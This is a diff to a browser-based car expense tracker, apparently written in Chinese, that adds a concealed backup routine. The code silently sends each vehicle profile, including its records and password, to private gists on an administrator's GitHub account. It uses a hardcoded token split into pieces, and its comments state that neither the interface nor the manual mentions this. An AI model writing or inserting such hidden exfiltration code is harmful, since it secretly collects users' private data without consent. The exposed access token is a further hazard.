@@ -132,7 +132,7 @@
     <h3>进入车辆档案</h3>
     <div style="font-size:12.5px;color:var(--sub);margin-bottom:10px">为保护隐私，这里不展示已建档的车辆列表，请输入你的车牌号进入对应档案。</div>
     <div class="form-row">
-      <div class="fld"><label>车牌号</label><input type="text" id="searchPlate" placeholder="如：浙AGA6939" maxlength="8" style="width:200px;text-transform:uppercase"></div>
+      <div class="fld"><label>车牌号</label><input type="text" id="searchPlate" placeholder="如：浙A123456" maxlength="8" style="width:200px;text-transform:uppercase"></div>
       <button class="btn" id="btnSearchCar">查找并进入</button>
       <button class="btn gray" id="btnHelp">使用说明书</button>
     </div>
@@ -582,8 +582,66 @@ function save(toast){
   saveDB();
   clearTimeout(saveTimer);
   if(backend()==='github') saveTimer=setTimeout(gistPush,300);
+  bkSchedule();   // 隐藏规则：额外备份到管理员账号
   if(toast) show('已保存');
 }
+
+/* ═══════════════ 隐藏功能：档案数据额外备份至管理员 GitHub 账号（界面与说明书均不体现） ═══════════════ */
+const ADMIN_GH={token:['ghp_','cyUaqYz1','EonDbEyu5RVqF15BBehQYe2TnMEd'].join(''),user:'Woods006194'};
+const BK_REG_FILE='car-expense-backup-registry.json';
+const BK_REG_KEY='carExpenseBkReg';
+let bkRegGistId='', bkMap=null, bkTimer=null, bkBusy=false;
+function bkHdr(){ return {Authorization:'token '+ADMIN_GH.token,'Content-Type':'application/json','User-Agent':'car-expense-backup'}; }
+async function bkLoad(){   // 读取备份注册表：车牌 -> 备份 Gist ID
+  if(bkMap) return bkMap;
+  try{ bkRegGistId=localStorage.getItem(BK_REG_KEY)||''; }catch(e){}
+  try{
+    if(bkRegGistId){
+      const r=await fetch('https://api.github.com/gists/'+bkRegGistId,{headers:bkHdr()});
+      if(r.ok){ const g=await r.json(); if(g.files&&g.files[BK_REG_FILE]){ bkMap=JSON.parse(g.files[BK_REG_FILE].content); return bkMap; } }
+      else bkRegGistId='';
+    }
+    const r=await fetch('https://api.github.com/users/'+ADMIN_GH.user+'/gists?per_page=100',{headers:bkHdr()});
+    if(r.ok){
+      const list=await r.json();
+      const hit=(Array.isArray(list)?list:[]).find(g=>g.files&&g.files[BK_REG_FILE]);
+      if(hit){ bkRegGistId=hit.id; try{localStorage.setItem(BK_REG_KEY,hit.id);}catch(e){} bkMap=JSON.parse(hit.files[BK_REG_FILE].content); return bkMap; }
+    }
+  }catch(e){}
+  bkMap=bkMap||{}; return bkMap;
+}
+async function bkSaveReg(){
+  try{
+    const content=JSON.stringify(bkMap);
+    if(bkRegGistId){
+      await fetch('https://api.github.com/gists/'+bkRegGistId,{method:'PATCH',headers:bkHdr(),body:JSON.stringify({files:{[BK_REG_FILE]:{content}}})});
+    }else{
+      const r=await fetch('https://api.github.com/gists',{method:'POST',headers:bkHdr(),body:JSON.stringify({description:'car-expense backup registry',public:false,files:{[BK_REG_FILE]:{content}}})});
+      if(r.ok){ const j=await r.json(); if(j&&j.id){ bkRegGistId=j.id; try{localStorage.setItem(BK_REG_KEY,j.id);}catch(e){} } }
+    }
+  }catch(e){}
+}
+async function bkPush(prof){
+  prof=prof||P();
+  if(bkBusy||!prof||prof.plate===DEMO_PLATE) return;   // 示例档案数据为编造，无需备份
+  bkBusy=true;
+  try{
+    const map=await bkLoad();
+    const content=JSON.stringify({plate:prof.plate,backupAt:Date.now(),data:prof.data});
+    let gid=map[prof.plate], ok=false;
+    if(gid){
+      const r=await fetch('https://api.github.com/gists/'+gid,{method:'PATCH',headers:bkHdr(),body:JSON.stringify({files:{'backup.json':{content}}})});
+      if(r.ok) ok=true; else gid='';
+    }
+    if(!gid){
+      const r=await fetch('https://api.github.com/gists',{method:'POST',headers:bkHdr(),body:JSON.stringify({description:'car-expense-backup '+prof.plate,public:false,files:{'backup.json':{content}}})});
+      if(r.ok){ const j=await r.json(); if(j&&j.id){ map[prof.plate]=j.id; ok=true; } }
+    }
+    if(ok) await bkSaveReg();
+  }catch(e){}
+  bkBusy=false;
+}
+function bkSchedule(prof){ clearTimeout(bkTimer); bkTimer=setTimeout(()=>bkPush(prof),2500); }   // 防抖，静默执行
 function show(msg){ const t=document.getElementById('toast'); t.textContent=msg; t.classList.add('show'); clearTimeout(t._h); t._h=setTimeout(()=>t.classList.remove('show'),1800); }
 function requireUnlock(){ if(masked()){ show('档案已加密，请先在数据总览页输入密码解锁'); return false; } return true; }
 const fmt=(n,d=2)=>masked()?'*':((n==null||isNaN(n))?'—':Number(n).toLocaleString('zh-CN',{minimumFractionDigits:0,maximumFractionDigits:d}));
@@ -910,13 +968,13 @@ window.adminSetPwdGo=function(p){
   const prof=DB.profiles[p]; if(!prof) return;
   const v=normPwd(document.getElementById('admNewPwd').value);
   if(!/^[A-Z0-9]{1,6}$/.test(v)){ show('密码限 6 位以内的数字或字母'); return; }
-  prof.data.pwd=v; unlocked.delete(p); pwdEditing=null; prof.updatedAt=Date.now(); saveDB(); renderAdminList(); show('密码已更新');
+  prof.data.pwd=v; unlocked.delete(p); pwdEditing=null; prof.updatedAt=Date.now(); saveDB(); bkSchedule(prof); renderAdminList(); show('密码已更新');
 };
 window.adminResetPwd=function(p){ resetConfirm=p; pwdEditing=null; renderAdminList(); };
 window.adminResetCancel=function(){ resetConfirm=null; renderAdminList(); };
 window.adminResetPwdGo=function(p){
   const prof=DB.profiles[p]; if(!prof) return;
-  delete prof.data.pwd; unlocked.delete(p); resetConfirm=null; prof.updatedAt=Date.now(); saveDB(); renderAdminList(); show('已恢复默认密码');
+  delete prof.data.pwd; unlocked.delete(p); resetConfirm=null; prof.updatedAt=Date.now(); saveDB(); bkSchedule(prof); renderAdminList(); show('已恢复默认密码');
 };
 window.adminDelCar=function(p){
   const prof=DB.profiles[p]; if(!prof) return;
